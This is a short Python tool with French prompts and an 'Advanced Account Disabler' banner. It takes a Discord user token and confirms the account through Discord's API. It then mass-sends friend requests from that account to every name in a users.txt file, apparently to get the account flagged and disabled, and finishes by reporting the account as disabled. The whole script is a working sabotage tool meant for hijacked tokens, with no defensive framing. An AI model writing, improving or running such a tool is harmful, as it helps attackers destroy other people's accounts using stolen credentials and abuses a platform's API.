import requests
import os
from colorama import Fore

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_header():
    header = f"""{Fore.RED}
 $$$$$$\  $$$$$$$\  $$\    $$\  $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$$\ $$$$$$$\         $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$\   $$\ $$$$$$$$\       $$$$$$$\  $$$$$$\  $$$$$$\   $$$$$$\  $$$$$$$\  $$\       $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$  __$$\ $$ |   $$ |$$  __$$\ $$$\  $$ |$$  __$$\ $$  _____|$$  __$$\       $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |$$$\  $$ |\__$$  __|      $$  __$$\ \_$$  _|$$  __$$\ $$  __$$\ $$  __$$\ $$ |      $$  _____|$$  __$$\ 
$$ /  $$ |$$ |  $$ |$$ |   $$ |$$ /  $$ |$$$$\ $$ |$$ /  \__|$$ |      $$ |  $$ |      $$ /  $$ |$$ /  \__|$$ /  \__|$$ /  $$ |$$ |  $$ |$$$$\ $$ |   $$ |         $$ |  $$ |  $$ |  $$ /  \__|$$ /  $$ |$$ |  $$ |$$ |      $$ |      $$ |  $$ |
$$$$$$$$ |$$ |  $$ |\$$\  $$  |$$$$$$$$ |$$ $$\$$ |$$ |      $$$$$\    $$ |  $$ |      $$$$$$$$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |$$ $$\$$ |   $$ |         $$ |  $$ |  $$ |  \$$$$$$\  $$$$$$$$ |$$$$$$$\ |$$ |      $$$$$\    $$$$$$$  |
$$  __$$ |$$ |  $$ | \$$\$$  / $$  __$$ |$$ \$$$$ |$$ |      $$  __|   $$ |  $$ |      $$  __$$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |$$ \$$$$ |   $$ |         $$ |  $$ |  $$ |   \____$$\ $$  __$$ |$$  __$$\ $$ |      $$  __|   $$  __$$< 
$$ |  $$ |$$ |  $$ |  \$$$  /  $$ |  $$ |$$ |\$$$ |$$ |  $$\ $$ |      $$ |  $$ |      $$ |  $$ |$$ |  $$\ $$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |\$$$ |   $$ |         $$ |  $$ |  $$ |  $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |      $$ |  $$ |
$$ |  $$ |$$$$$$$  |   \$  /   $$ |  $$ |$$ | \$$ |\$$$$$$  |$$$$$$$$\ $$$$$$$  |      $$ |  $$ |\$$$$$$  |\$$$$$$  | $$$$$$  |\$$$$$$  |$$ | \$$ |   $$ |         $$$$$$$  |$$$$$$\ \$$$$$$  |$$ |  $$ |$$$$$$$  |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |
\__|  \__|\_______/     \_/    \__|  \__|\__|  \__| \______/ \________|\_______/       \__|  \__| \______/  \______/  \______/  \______/ \__|  \__|   \__|         \_______/ \______| \______/ \__|  \__|\_______/ \________|\________|\__|  \__|

                          """
    print(header)

def disable_account():
    clear()
    display_header()
    print(f"{Fore.YELLOW}Entrez un token pour désactiver le compte:")
    usertoken = str(input(f"{Fore.RED}Token: {Fore.YELLOW}"))
    headers = {'Authorization': usertoken, 'Content-Type': 'application/json'}
    
    try:
        res = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
        if res.status_code == 200:
            user_data = res.json()
            print(f"\n{Fore.YELLOW}Détail de l'utilisateur: {Fore.WHITE}{user_data['username']}#{user_data['discriminator']} - ({user_data['id']})")
            input(f"{Fore.YELLOW}Si ces détails sont corrects, appuyez sur Entrée! {Fore.RESET}(Cela désactivera le compte)")
            print()
            with open('users.txt', 'r') as users_file:
                usernames = users_file.read().splitlines()
                for username in usernames:
                    username_parts = username.split('#')
                    r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': username_parts[0], 'discriminator': username_parts[1]})
                    if r.status_code == 204:
                        print(f"{Fore.GREEN}{username_parts[0]}#{username_parts[1]} ajouté!")
                    else:
                        print(f"{Fore.RED}Une erreur s'est produite lors de l'ajout de {username_parts[0]}#{username_parts[1]}")
            print(f"{Fore.GREEN}Compte désactivé avec succès")
        else:
            print(f"{Fore.RED}Le token fourni n'est pas valide.")
    except Exception as e:
        print(f"{Fore.RED}Une erreur s'est produite lors de la tentative de désactivation du compte: {str(e)}")

    input(f"{Fore.YELLOW}Appuyez sur ENTREE pour quitter")

if __name__ == "__main__":
    disable_account()
